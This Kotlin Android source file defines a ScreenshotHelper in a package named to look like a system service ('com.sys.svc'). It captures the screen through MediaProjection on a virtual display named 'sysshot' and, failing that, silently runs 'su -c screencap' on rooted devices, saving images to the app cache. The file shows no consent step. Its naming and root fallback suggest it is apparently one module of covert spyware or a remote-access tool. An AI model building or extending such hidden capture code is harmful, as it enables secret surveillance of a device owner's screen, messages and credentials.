package com.sys.svc.helpers

import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.os.Handler
import android.os.Looper
import com.sys.svc.Logger
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object ScreenshotHelper {

    fun take(ctx: Context): File? {
        val proj = MediaProjectionHolder.createProjection(ctx)
        if (proj != null) {
            val result = captureViaProjection(ctx, proj)
            try { proj.stop() } catch (_: Exception) {}
            if (result != null) return result
        }
        if (ShellHelper.isRooted()) return captureViaRoot(ctx)
        return null
    }

    private fun captureViaProjection(ctx: Context, proj: MediaProjection): File? {
        return try {
            val dm = ctx.resources.displayMetrics
            val w = dm.widthPixels
            val h = dm.heightPixels
            val dpi = dm.densityDpi
            val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
            val handler = Handler(Looper.getMainLooper())
            proj.registerCallback(object : MediaProjection.Callback() {}, handler)
            val vd = proj.createVirtualDisplay(
                "sysshot", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface, null, handler
            )
            val latch = CountDownLatch(1)
            var bmp: Bitmap? = null
            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val plane = img.planes[0]
                    val rowStride = plane.rowStride
                    val pixelStride = plane.pixelStride
                    val padding = rowStride - pixelStride * w
                    val b = Bitmap.createBitmap(
                        w + padding / pixelStride, h, Bitmap.Config.ARGB_8888
                    )
                    b.copyPixelsFromBuffer(plane.buffer)
                    bmp = Bitmap.createBitmap(b, 0, 0, w, h)
                } catch (e: Exception) {
                    Logger.e("Shot", "decode", e)
                } finally {
                    img.close()
                    latch.countDown()
                }
            }, handler)
            latch.await(4, TimeUnit.SECONDS)
            vd.release()
            reader.close()
            val out = bmp ?: return null
            val f = File(ctx.cacheDir, "shot_${System.currentTimeMillis()}.png")
            FileOutputStream(f).use { out.compress(Bitmap.CompressFormat.PNG, 100, it) }
            f
        } catch (e: Exception) {
            Logger.e("Shot", "projection", e)
            null
        }
    }

    private fun captureViaRoot(ctx: Context): File? {
        return try {
            val f = File(ctx.cacheDir, "shot_${System.currentTimeMillis()}.png")
            val p = Runtime.getRuntime().exec(arrayOf(
                "su", "-c", "screencap -p '${f.absolutePath}'"
            ))
            p.waitFor(5, TimeUnit.SECONDS)
            if (f.exists() && f.length() > 0) f else null
        } catch (e: Exception) {
            Logger.e("Shot", "root", e)
            null
        }
    }
}